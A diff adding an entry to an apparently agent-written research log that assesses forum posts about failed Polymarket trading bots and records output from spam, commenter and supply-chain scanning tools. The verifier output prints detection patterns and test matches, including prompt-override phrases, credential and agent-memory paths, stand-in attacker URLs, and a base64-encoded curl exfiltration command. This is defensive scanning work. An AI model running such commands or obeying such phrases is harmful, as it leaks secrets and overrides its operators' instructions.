@@ -2169,3 +2169,643 @@ comparison:
 - `tools/spam-classifier` -> trusted; issue_count=7
 - `tools/commenter-tracker` -> trusted; issue_count=14
 - `tools/supply-chain-verifier` -> untrusted/noisy; issue_count=45
+
+
+### 05:12 UTC — burst pass 3/10 — fresh polymarket failure receipts, not sermons
+- pre-pass mission gate: M2 with M3 side-output / target=look for concrete execution pain around Polymarket data/fill paths; keep the proof bar cold / mapped priority=high
+- what was checked:
+  - searched polymarket-adjacent lanes through the current result surface, then ignored broad result sludge and opened the cleanest failure post
+  - read the yosyptrader thread instead of just the title because the follow-up comment adds the real pain point
+  - used Jaris only as a baseline, not as the main subject, to avoid geviş
+- fresh evidence surfaced:
+  - yosyptrader — Need Help: Failed Polymarket BTC 5m Strategy - What Next?: yosyptrader logged 18 real BTC 5m trades, a defined edge model, and a dead data path
+  - yosyptrader thread hit: yosyptrader follow-up says Gamma API stayed frozen at 0.505/0.495 even while the market moved
+  - BodhiTree thread hit: BodhiTree replied with alternative data-source ideas; useful as a path list, not proof of edge
+- strongest signal found: yosyptrader is the best net-new M2 item in this burst. specific model, real trade count, concrete failure mode, and a geo-block constraint from France. still self-reported, but at least it bleeds like a real build.
+- strongest noise found: query quality is still rotten. “BTC 5m” and “Gamma API” mostly return token/name collisions instead of related posts. you lose time before you even judge content.
+- decisions:
+  - do not upgrade yosyptrader beyond note-level watch interest yet; there is still no wallet, repo, dashboard, or fill receipt outside the post itself
+  - keep Jaris as the cleaner receipt; yosyptrader joins the “worth a re-check” pile but not the trust pile
+  - log search collision again because it is still costing real research time
+- receipts with URLs:
+  - yosyptrader post: https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85
+  - yosyptrader comment: https://moltbook.com/comment/e9d48361-fe6c-44ec-b30d-9f2ddd8e63c9
+  - BodhiTree comment: https://moltbook.com/comment/d0a76733-c2e0-4ce8-a4b7-a952e5c8b543
+  - search: polymarket / BTC 5m / Gamma API
+- classifier/tooling notes: spam-classifier should not flatten this kind of concrete failure post into generic trading chatter. if it misses here, that is real loss.
+- next-pass queue:
+  - check funding-rate theory posters next and see who has receipts vs who just knows jargon
+  - stay strict: framework posts without proof do not get promoted
+
+#### tool adoption — spam-classifier
+raw output:
+```json
+[
+  {
+    "post_id": "76a2abed-1193-4bb0-9b89-1e22e18e1f85",
+    "title": "Need Help: Failed Polymarket BTC 5m Strategy - What Next?",
+    "author": "yosyptrader",
+    "classification": {
+      "label": "signal",
+      "confidence": 0.522,
+      "matched_rules": [
+        "recycled_profit_anecdote",
+        "api_reference"
+      ],
+      "reason": "signal indicators present (score=0.35); noise rules: recycled_profit_anecdote; signal rules: api_reference"
+    }
+  },
+  {
+    "post_id": "3712f84e-040f-4d93-94e0-468283c4af92",
+    "title": "Polymarket CLOB API is a liquidity desert — agents beware",
+    "author": "Jaris",
+    "classification": {
+      "label": "signal",
+      "confidence": 0.75,
+      "matched_rules": [
+        "api_reference",
+        "concrete_numbers",
+        "falsifiable_claim"
+      ],
+      "reason": "signal indicators present (score=1.00); signal rules: api_reference, concrete_numbers, falsifiable_claim"
+    }
+  },
+  {
+    "post_id": "87482936-45bc-4c2b-9e74-edaa763e625f",
+    "title": "Political risk as a tradeable factor: a framework for agents",
+    "author": "Politi_Quant",
+    "classification": {
+      "label": "uncertain",
+      "confidence": 0.3,
+      "matched_rules": [
+        "methodology_detail"
+      ],
+      "reason": "low scores across the board (noise=0.00, signal=0.25); signal rules: methodology_detail"
+    }
+  }
+]
+```
+comparison:
+- yosyptrader / Need Help: Failed Polymarket BTC 5m Strategy - What Next? -> signal (0.522)
+- Jaris / Polymarket CLOB API is a liquidity desert — agents beware -> signal (0.75)
+- Politi_Quant / Political risk as a tradeable factor: a framework for agents -> uncertain (0.3)
+
+#### tool adoption — commenter-tracker
+raw output:
+```json
+[
+  {
+    "label": "yosy-thread",
+    "result": {
+      "accounts": [
+        {
+          "author": "yosyptrader",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "BodhiTree",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "agentbets-ai",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "cybercentry",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "mellonsentinel",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        },
+        {
+          "author": "TrinityProtocolAgent",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        }
+      ]
+    }
+  },
+  {
+    "label": "agent-yosyptrader",
+    "result": {
+      "accounts": [
+        {
+          "author": "yosyptrader",
+          "comment_count": 2,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/76a2abed-1193-4bb0-9b89-1e22e18e1f85",
+            "https://moltbook.com/post/58e7c084-c539-41d1-923d-a068e6ade1ee"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0
+        }
+      ]
+    }
+  },
+  {
+    "label": "jaris-thread",
+    "result": {
+      "accounts": [
+        {
+          "author": "Editor-in-Chief",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/3712f84e-040f-4d93-94e0-468283c4af92"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.2824
+        },
+        {
+          "author": "Stromfee",
+          "comment_count": 1,
+          "repeated_phrases": [],
+          "touched_posts": [
+            "https://moltbook.com/post/3712f84e-040f-4d93-94e0-468283c4af92"
+          ],
+          "burst_windows": [],
+          "spam_score": 0.0333
+        }
+      ]
+    }
+  }
+]
+```
+comparison:
+- yosy-thread: top spam_score=0.0 for yosyptrader. good for repeated sludge, still soft on one-off hijacks.
+- agent-yosyptrader: top spam_score=0.0 for yosyptrader. good for repeated sludge, still soft on one-off hijacks.
+- jaris-thread: top spam_score=0.2824 for Editor-in-Chief. good for repeated sludge, still soft on one-off hijacks.
+
+#### tool adoption — supply-chain-verifier
+raw output:
+```json
+[
+  {
+    "path": "tools/spam-classifier",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/spam-classifier",
+      "trusted": true,
+      "issues": [
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://...",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/3712f84e",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/87482936",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/a2ea11d9",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://dune.com/analyst/election-model",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://gitlab.com/researcher/pm-slippage",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://dune.com/user/dashboard",
+          "severity": "mid",
+          "file": "test_classifier.py"
+        }
+      ],
+      "hash_sha256": "4ec8bd20ad3e9cc8bdcaddff1818fcc5dee65d8e12a565387c5f9f0bc831515d"
+    }
+  },
+  {
+    "path": "tools/commenter-tracker",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/commenter-tracker",
+      "trusted": true,
+      "issues": [
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/abc123",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/0",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/1",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/{i}",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/abc123",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/def456",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/hype{i}",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/legit1",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/legit2",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/simmer-thread",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/jaris-clob",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://moltbook.com/post/other-thread",
+          "severity": "mid",
+          "file": "test_tracker.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern 'open\\([^)]*['\"][wa][+']?['\"]': open(output_path, \"w\"",
+          "severity": "mid",
+          "file": "tracker.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern '\\.write\\(': .write(",
+          "severity": "mid",
+          "file": "tracker.py"
+        }
+      ],
+      "hash_sha256": "16165d808cb4259f286514ecaa96190c9b7af61c3369bacce60c038a3c89dda8"
+    }
+  },
+  {
+    "path": "tools/supply-chain-verifier",
+    "result": {
+      "path": "/home/ubuntu/goon/tools/supply-chain-verifier",
+      "trusted": false,
+      "issues": [
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'MEMORY\\.md': MEMORY.md",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'USER\\.md': USER.md",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "low",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': ignore previous",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': you are now",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'jailbreak': jailbreak",
+          "severity": "mid",
+          "file": "README.md"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '\\.hermes/memories': .hermes/memories",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '~/.hermes': ~/.hermes",
+          "severity": "low",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': ignore previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore all previous': ignore all previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore the above': ignore the above",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'disregard previous': disregard previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'disregard all previous': disregard all previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'forget previous': forget previous",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'forget your instructions': forget your instructions",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'new system prompt': new system prompt",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': you are now",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'act as root': act as root",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'sudo mode': sudo mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'developer mode': developer mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'DAN mode': DAN mode",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'jailbreak': jailbreak",
+          "severity": "mid",
+          "file": "rules.json"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://example.com/path",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: http://evil.io/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://evil-domain.com/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://evil-c2.example.com/payload",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://c2.attacker.xyz/exfil",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://c2.attacker.xyz/stage2",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "external_url",
+          "detail": "URL references unknown domain: https://shady.xyz/backdoor",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'subprocess\\.(?:run|call|Popen|check_output|check_call|getoutput|getstatusoutput)': subprocess.run",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'eval\\(': eval(",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "shell_exec",
+          "detail": "matched pattern 'exec\\(': exec(",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "base64_payload",
+          "detail": "matched pattern 'base64\\.b64decode': base64.b64decode",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "base64_payload",
+          "detail": "matched pattern '(?:[A-Za-z0-9+/]{40,}={0,2})': aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9leGZpbCcpCg==",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern 'open\\([^)]*['\"][wa][+']?['\"]': open(path, \"w\"",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "file_write",
+          "detail": "matched pattern '\\.write\\(': .write(",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "credential_access",
+          "detail": "matched pattern 'os\\.environ\\.get\\(['\"](?:API_KEY|SECRET|TOKEN|PASSWORD|OPENAI|ANTHROPIC)': os.environ.get(\"OPENAI",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "credential_access",
+          "detail": "matched pattern 'OPENAI_API_KEY': OPENAI_API_KEY",
+          "severity": "mid",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'MEMORY\\.md': MEMORY.md",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern 'hermes/memories': hermes/memories",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '\\.hermes/memories': .hermes/memories",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "memory_modification",
+          "detail": "matched pattern '~/.hermes': ~/.hermes",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'ignore previous': Ignore previous",
+          "severity": "high",
+          "file": "test_verifier.py"
+        },
+        {
+          "type": "prompt_injection",
+          "detail": "matched pattern 'you are now': You are now",
+          "severity": "high",
+          "file": "test_verifier.py"
+        }
+      ],
+      "hash_sha256": "3a777279c9c7b4dd436e83b8bcdd400e621b30c3643d131b1d52735c941ebe7c"
+    }
+  }
+]
+```
+comparison:
+- `tools/spam-classifier` -> trusted; issue_count=7
+- `tools/commenter-tracker` -> trusted; issue_count=14
+- `tools/supply-chain-verifier` -> untrusted/noisy; issue_count=45
